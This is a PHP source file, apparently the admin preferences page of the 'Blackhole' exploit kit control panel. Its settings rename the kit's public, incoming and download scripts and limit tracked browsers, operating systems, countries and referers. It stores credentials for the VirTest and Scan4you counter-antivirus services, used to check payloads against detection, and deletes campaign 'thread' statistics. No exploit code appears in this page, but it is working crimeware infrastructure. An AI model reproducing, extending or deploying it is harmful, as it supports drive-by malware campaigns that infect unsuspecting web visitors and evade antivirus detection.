<?php 
if( !defined("ADMIN_LOADED") ) 
{
    exit();
}

define("PAGE", "prefs");
$languages = Lang::getalllanguages();
$defaultLanguage = Config::get("DefaultLanguage", "en");
$templates = Template::getalltemplates();
$defaultTemplate = Config::get("DefaultTemplate", "default");
$threads = db::select("select ID, Title from Threads where Deleted = 0 order by Title asc");
$secs = Lang::get("Seconds");
$min = Lang::get("Minute");
$mins = Lang::get("Minutes");
$intervals = array( "never" => "never", 5 => "5 " . $secs, 10 => "10 " . $secs, 20 => "20 " . $secs, 30 => "30 " . $secs, 60 => "1 " . $min, 120 => "2 " . $mins, 300 => "5 " . $mins, 600 => "10 " . $mins );
$imgPath = Config::get("AdminScriptName") . "?" . Config::get("MainParamName") . "=file&type=img&file=";
echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\n\t\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\n<head>\n\t\n\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>\n\n\t<title>Blackhole v.";
echo Config::get("Version");
echo "</title>\n\t\n\t<script type=\"text/javascript\" src=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=file&type=js&file=min.js\"></script>\n\t\n\t<link rel=\"stylesheet\" href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=file&type=css&file=main.css\" type=\"text/css\" media=\"screen\" />\n\t\n\t<script>\n\t\tvar slider = null;\n\t\tvar sel = null;\n\t\tvar label = null;\n\t\tfunction updateTimeout() {\n\t\t\tif (slider == null) {\n\t\t\t\tslider = \$\$('#fd-slider-updateTimeout .fd-slider-handle')[0];\n\t\t\t}\n\t\t\tif (sel == null) {\n\t\t\t\tsel = \$(\"updateTimeout\");\n\t\t\t}\n\t\t\tif (label == null) {\n\t\t\t\tlabel = \$('updateTimeoutLabel');\n\t\t\t}\n\t\t\tvar left = parseInt(slider.style.left);\n\t\t\tvar index = sel.selectedIndex;\n\t\t\tvar value = 0;\n\t\t\tvalue = sel.options[index].value;\n\t\t\tvar text = sel.options[index].innerHTML;\n\t\t\tif (value == 0) {\n\t\t\t\tPrefs.interval = 9999;\n\t\t\t} else {\n\t\t\t\tPrefs.interval = value;\n\t\t\t}\n\t\t\t\n\t\t\tlabel.update(\"";
echo Lang::get("Change");
echo ": <b>\" + text + '</b>');\n\t\t};\n\t\tfdSliderController.addEvent(window, 'load', updateTimeout);\n\t</script>\n\n</head>\n<body>\n\t<div id=\"alert\" style=\"display:none;\">\n\t\t<div class=\"alertContent\">\n\t\t\t<div id=\"alertTitle\">Delete widget?</div>\n\t\t\t<div class=\"confirm\">\n\t\t\t\t<div id=\"apply\">Delete</div>\n\t\t\t\t<div id=\"cancel\" onclick=\"Alert.cancel()\">Cancel</div>\n\t\t\t</div>\n\t\t</div>\n\t</div>\n\t<div class=\"pageLayout\">\n\t\t<div class=\"test\"><div class=\"test2\">\n\t\t\t";
include("menu.php");
echo "\t\t\t\n\t\t\t<div id=\"data\" class=\"content\">\n\t\t\t\t<div class=\"prefColumn\">\n\t\t\t\t\t<div class=\"prefBlock filename\">\n\t\t\t\t\t\t<div class=\"title\">";
echo Lang::get("ChangeFilenameTitle");
echo "</div>\n\t\t\t\t\t\t<div class=\"content\">\n\t\t\t\t\t\t\t<div>";
echo Lang::get("MainScript");
echo ":</div>\n\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t<div><input type=\"text\" id=\"MainRename\" value=\"";
echo str_replace(".php", "", Config::get("AdminScriptName"));
echo "\"/></div>\n\t\t\t\t\t\t\t\t<div class=\"btn\" onclick=\"Prefs.saveFileName()\">";
echo Lang::get("ChangeFilename");
echo "</div>\n\t\t\t\t\t\t\t\t<div class=\"comment\" id=\"MainRenameSuccess\" style=\"display:none;\"><img src=\"";
echo $imgPath;
echo "accept.png\"/><span>";
echo Lang::get("FilenameChanged");
echo "</span></div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t\t<div class=\"content\">\n\t\t\t\t\t\t\t<div>";
echo Lang::get("PublicScript");
echo ":</div>\n\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t<div><input type=\"text\" id=\"StatRename\" value=\"";
echo Config::get("StatFileName");
echo "\"/></div>\n\t\t\t\t\t\t\t\t<div class=\"btn\" onclick=\"Prefs.saveStatFileName()\">";
echo Lang::get("ChangeFilename");
echo "</div>\n\t\t\t\t\t\t\t\t<div class=\"comment\" id=\"StatRenameSuccess\" style=\"display:none;\"><img src=\"";
echo $imgPath;
echo "accept.png\"/><span>";
echo Lang::get("FilenameChanged");
echo "</span></div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t\t<div class=\"content\">\n\t\t\t\t\t\t\t<div>";
echo Lang::get("IncomingScript");
echo ":</div>\n\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t<div><input type=\"text\" id=\"FrameRename\" value=\"";
echo Config::get("MainFileName");
echo "\"/></div>\n\t\t\t\t\t\t\t\t<div class=\"btn\" onclick=\"Prefs.saveFrameFileName()\">";
echo Lang::get("ChangeFilename");
echo "</div>\n\t\t\t\t\t\t\t\t<div class=\"comment\" id=\"FrameRenameSuccess\" style=\"display:none;\"><img src=\"";
echo $imgPath;
echo "accept.png\"/><span>";
echo Lang::get("FilenameChanged");
echo "</span></div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t\t<div class=\"content\">\n\t\t\t\t\t\t\t<div>";
echo Lang::get("DownloadScript");
echo ":</div>\n\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t<div><input type=\"text\" id=\"DownloadFileName\" value=\"";
echo Config::get("DownloadFileName");
echo "\"/></div>\n\t\t\t\t\t\t\t\t<div class=\"btn\" onclick=\"Prefs.saveDownloadFileName()\">";
echo Lang::get("ChangeFilename");
echo "</div>\n\t\t\t\t\t\t\t\t<div class=\"comment\" id=\"DownloadFileNameSuccess\" style=\"display:none;\"><img src=\"";
echo $imgPath;
echo "accept.png\"/><span>";
echo Lang::get("FilenameChanged");
echo "</span></div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t\t<div class=\"content\">\n\t\t\t\t\t\t\t<div>";
echo Lang::get("Samba");
echo ":</div>\n\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t<div><input type=\"text\" id=\"urltosmb\" value=\"";
echo Config::get("urltosmb");
echo "\"/></div>\n\t\t\t\t\t\t\t\t<div class=\"btn\" onclick=\"Prefs.saveurltosmb()\">";
echo Lang::get("ChangeFilename");
echo "</div>\n\t\t\t\t\t\t\t\t<div class=\"comment\" id=\"urltosmbSuccess\" style=\"display:none;\"><img src=\"";
echo $imgPath;
echo "accept.png\"/><span>";
echo Lang::get("FilenameChanged");
echo "</span></div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t\t<div class=\"content\">\n\t\t\t\t\t\t\t<div>";
echo Lang::get("StatParamName");
echo ":</div>\n\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t<div><input type=\"text\" id=\"StatParamName\" value=\"";
echo Config::get("StatParamName");
echo "\"/></div>\n\t\t\t\t\t\t\t\t<div class=\"btn\" onclick=\"Prefs.saveStatParamName()\">";
echo Lang::get("Change");
echo "</div>\n\t\t\t\t\t\t\t\t<div class=\"comment\" id=\"StatParamNameSuccess\" style=\"display:none;\"><img src=\"";
echo $imgPath;
echo "accept.png\"/><span>";
echo Lang::get("Changed");
echo "</span></div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</div>\n\t\t\t\t\t<div class=\"prefBlock password\">\n\t\t\t\t\t\t<div class=\"title\">";
echo Lang::get("ChangePassword");
echo "</div>\n\t\t\t\t\t\t<div class=\"content\">\n\t\t\t\t\t\t\t<div class=\"oldPassword\">\n\t\t\t\t\t\t\t\t<div>";
echo Lang::get("OldPassword");
echo "</div>\n\t\t\t\t\t\t\t\t<div><input type=\"password\" id=\"OldPassword\"/></div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div class=\"newPassword\">\n\t\t\t\t\t\t\t\t<div>";
echo Lang::get("NewPassword");
echo "</div>\n\t\t\t\t\t\t\t\t<div><input type=\"password\" id=\"NewPassword1\" onkeyup=\"Prefs.checkPasswords()\"/></div>\n\t\t\t\t\t\t\t\t<div>";
echo Lang::get("ConfirmPassword");
echo "</div>\n\t\t\t\t\t\t\t\t<div class=\"comment\"><input type=\"password\" id=\"NewPassword2\" onkeyup=\"Prefs.checkPasswords()\"/><br/> <span id=\"ConfirmComment\" style=\"display:none;\"><img src=\"";
echo $imgPath;
echo "err.png\"/>Passwords dont match</span></div>\n\t\t\t\t\t\t\t\t<div class=\"btn\" onclick=\"Prefs.savePassword()\">";
echo Lang::get("ChangePassword");
echo "</div>\n\t\t\t\t\t\t\t\t<div class=\"comment\" id=\"PasswordSuccess\" style=\"display:none;\"><img src=\"";
echo $imgPath;
echo "accept.png\"/><span>";
echo Lang::get("PasswordChanged");
echo "</span></div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</div>\n\t\t\t\t\t<div class=\"prefBlock interval\">\n\t\t\t\t\t\t<div class=\"title\">";
echo Lang::get("ChangeInterval");
echo "</div>\n\t\t\t\t\t\t<div class=\"content\">\n\t\t\t\t\t\t\t<div style=\"height:32px;\">\n\t\t\t\t\t\t\t\t<select name=\"AjaxAutoreloadInterval\" id=\"updateTimeout\" class=\"fd_slider fd_callback_updateTimeout\"> \n\t\t\t\t\t\t\t\t\t";
foreach( $intervals as $interval => $title ) 
{
    echo "\t\t\t\t\t\t\t\t\t\t<option value=\"";
    echo $interval;
    echo "\" ";
    echo ($interval == Config::get("AjaxAutoreloadInterval") ? "selected=\"selected\"" : "");
    echo ">";
    echo $title;
    echo "</option>\n\t\t\t\t\t\t\t\t\t";
}
echo "\t\t\t\t\t\t\t\t</select> \n\t\t\t\t\t\t\t\t<img src=\"";
echo $imgPath;
echo "intervals.png\"/>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div class=\"btn\" id=\"updateTimeoutLabel\" onclick=\"Prefs.saveInterval()\"></div>\n\t\t\t\t\t\t\t<div class=\"comment\" id=\"IntervalSuccess\" style=\"display:none;\"><img src=\"";
echo $imgPath;
echo "accept.png\"/><span>";
echo Lang::get("IntervalChanged");
echo "</span></div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</div>\t\t\t\n\t\t\t\t</div>\n\t\t\t\t\n\t\t\t\t<div class=\"prefColumn prefColumn2\">\n\t\t\t\t\t<div class=\"prefBlock interface\">\n\t\t\t\t\t\t<div class=\"title\">";
echo Lang::get("Interface");
echo "</div>\n\t\t\t\t\t\t<div class=\"content\">\n\t\t\t\t\t\t\t<div>";
echo Lang::get("Language");
echo ":</div>\n\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t\t<select name=\"DefaultLanguage\" id=\"Language\">\n\t\t\t\t\t\t\t\t\t\t";
foreach( $languages as $code => $language ) 
{
    echo "\t\t\t\t\t\t\t\t\t\t\t<option value=\"";
    echo $code;
    echo "\" ";
    echo ($code == $defaultLanguage ? "selected=\"selected\"" : "");
    echo ">";
    echo $language;
    echo "</option>\n\t\t\t\t\t\t\t\t\t\t";
}
echo "\t\t\t\t\t\t\t\t\t</select>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t<div class=\"btn\" onclick=\"Prefs.saveLanguage()\">";
echo Lang::get("Change");
echo "</div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\n\t\t\t\t\t\t\t<div>";
echo Lang::get("Template");
echo ":</div>\n\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t\t<select name=\"DefaultTemplate\" id=\"Template\">\n\t\t\t\t\t\t\t\t\t\t";
foreach( $templates as $template ) 
{
    echo "\t\t\t\t\t\t\t\t\t\t\t<option value=\"";
    echo $template;
    echo "\" ";
    echo ($template == $defaultTemplate ? "selected=\"selected\"" : "");
    echo ">";
    echo $template;
    echo "</option>\n\t\t\t\t\t\t\t\t\t\t";
}
echo "\t\t\t\t\t\t\t\t\t</select>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t<div class=\"btn\" onclick=\"Prefs.saveTemplate()\">";
echo Lang::get("Change");
echo "</div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</div>\n\t\t\t\t\t<div class=\"prefBlock limits\">\n\t\t\t\t\t\t<div class=\"title\">";
echo Lang::get("Limits");
echo "</div>\n\t\t\t\t\t\t<div class=\"content\">\n\t\t\t\t\t\t\t<div class=\"limit\">\n\t\t\t\t\t\t\t\t<div>";
echo Lang::get("ConfigBrowserLimitLabel");
echo ":</div>\n\t\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t\t<input type=\"text\" id=\"MaxBrowsersLimit\" value=\"";
echo Config::get("MaxBrowsersLimit");
echo "\"/>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div class=\"limit\">\n\t\t\t\t\t\t\t\t<div>";
echo Lang::get("ConfigOSLimitLabel");
echo ":</div>\n\t\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t\t<input type=\"text\" id=\"MaxOSLimit\" value=\"";
echo Config::get("MaxOSLimit");
echo "\"/>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div class=\"limit\">\n\t\t\t\t\t\t\t\t<div>";
echo Lang::get("ConfigContriesLimitLabel");
echo ":</div>\n\t\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t\t<input type=\"text\" id=\"MaxCountriesLimit\" value=\"";
echo Config::get("MaxCountriesLimit");
echo "\"/>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div class=\"limit\">\n\t\t\t\t\t\t\t\t<div>";
echo Lang::get("ConfigReferersLimitLabel");
echo ":</div>\n\t\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t\t<input type=\"text\" id=\"MaxReferersLimit\" value=\"";
echo Config::get("MaxReferersLimit");
echo "\"/>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div class=\"limit\">\n\t\t\t\t\t\t\t\t<div><input type=\"checkbox\" style=\"width:auto;\" id=\"ShowReferers\" ";
if( Config::get("ShowReferers") ) 
{
    echo "checked=\"checked\"";
}

echo "/> <label for=\"ShowReferers\">";
echo Lang::get("ConfigReferersShowLabel");
echo "</label></div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\n\t\t\t\t\t\t\t<div class=\"limit\">\n\t\t\t\t\t\t\t\t<div class=\"btn\" onclick=\"Prefs.saveLimits()\">";
echo Lang::get("ConfigSubmitButton");
echo "</div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div class=\"limit\">\n\t\t\t\t\t\t\t\t<div class=\"comment\" id=\"LimitsSuccess\" style=\"display:none;\"><img src=\"";
echo $imgPath;
echo "accept.png\"/><span>";
echo Lang::get("LimitsChanged");
echo "</span></div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</div>\n\t\t\t\t\t<div class=\"prefBlock virtest\">\n\t\t\t\t\t\t";
$login = Config::get("virtestLogin");
if( strpos($login, ":::") !== false ) 
{
    list($service, $login) = explode(":::", $login);
}
else
{
    $service = 0;
}

echo "\t\t\t\t\t\t<div class=\"title\">";
echo Lang::get("VirTest");
echo "</div>\n\t\t\t\t\t\t<div class=\"content\">\n\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t<div>";
echo Lang::get("AVService");
echo ":</div>\n\t\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t\t<select id=\"AVService\">\n\t\t\t\t\t\t\t\t\t\t<option value=\"0\" ";
if( $service == 0 ) 
{
    echo "selected=\"selected\"";
}

echo ">VirTest</option>\n\t\t\t\t\t\t\t\t\t\t<option value=\"1\" ";
if( $service == 1 ) 
{
    echo "selected=\"selected\"";
}

echo ">Scan4you</option>\n\t\t\t\t\t\t\t\t\t</select>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div style=\"clear:both\"></div>\n\t\t\t\t\t\t\t<div class=\"limit\">\n\t\t\t\t\t\t\t\t<div>";
echo Lang::get("VirLogin");
echo ":</div>\n\t\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t\t<input type=\"text\" id=\"virtestLogin\" value=\"";
echo $login;
echo "\"/>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div class=\"limit\">\n\t\t\t\t\t\t\t\t<div>";
echo Lang::get("VirPass");
echo ":</div>\n\t\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t\t<input type=\"password\" id=\"virtestPass\" value=\"";
echo Config::get("virtestPass");
echo "\"/>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div class=\"limit\" style=\"padding-top:16px;\">\n\t\t\t\t\t\t\t\t<div class=\"btn\" onclick=\"Prefs.saveVir()\">";
echo Lang::get("ConfigSubmitButton");
echo "</div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div class=\"limit\" style=\"padding-top:16px;\">\n\t\t\t\t\t\t\t\t<div class=\"comment\" id=\"VirSuccess\" style=\"display:none;\"><img src=\"";
echo $imgPath;
echo "accept.png\"/><span>";
echo Lang::get("VirChanged");
echo "</span></div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</div>\n\t\t\t\t\t<div class=\"prefBlock totalDelete\">\n\t\t\t\t\t\t<div class=\"title\">";
echo Lang::get("DeleteStatistics");
echo "</div>\n\t\t\t\t\t\t<div class=\"content\">\n\t\t\t\t\t\t\t<div class=\"delbtn\" onclick=\"Prefs.totalDelete()\" style=\"float:left;\">";
echo Lang::get("DeleteAll");
echo "</div>\n\t\t\t\t\t\t\t<div class=\"comment\" id=\"TotalDeleteSuccess\" style=\"display:none;\"><img src=\"";
echo $imgPath;
echo "accept.png\"/><span>";
echo Lang::get("DataDeleted");
echo "</span></div>\n\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\n\t\t\t\t\t\t\t<br/>\n\t\t\t\t\t\t\t<span>";
echo Lang::get("DeleteConfirm");
echo "</span>\n\t\t\t\t\t\t\t<br/><br/>\n\t\t\t\t\t\t\t<div style=\"float:left;\">";
echo Lang::get("Thread");
echo ": \n\t\t\t\t\t\t\t<select id=\"threadSelect\">\n\t\t\t\t\t\t\t\t";
foreach( $threads as $thread ) 
{
    echo "\t\t\t\t\t\t\t\t\t<option value=\"";
    echo $thread["ID"];
    echo "\">";
    echo $thread["Title"];
    echo "</option>\n\t\t\t\t\t\t\t\t";
}
echo "\t\t\t\t\t\t\t</select></div>\n\t\t\t\t\t\t\t<div class=\"delbtn\" onclick=\"Prefs.threadDelete()\" style=\"float:left;\">";
echo Lang::get("DeleteThread");
echo "</div>\n\t\t\t\t\t\t\t<div class=\"comment\" id=\"ThreadDeleteSuccess\" style=\"display:none;\"><img src=\"";
echo $imgPath;
echo "accept.png\"/><span>";
echo Lang::get("ThreadDeleted");
echo "</span></div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t</div>\n\t\t</div></div>\t\n\t\t<div class=\"footer\">\n\t\t\t<b>Blackhole v.";
echo Config::get("Version");
echo "</b>\n\t\t</div>\n</body>\n</html>";

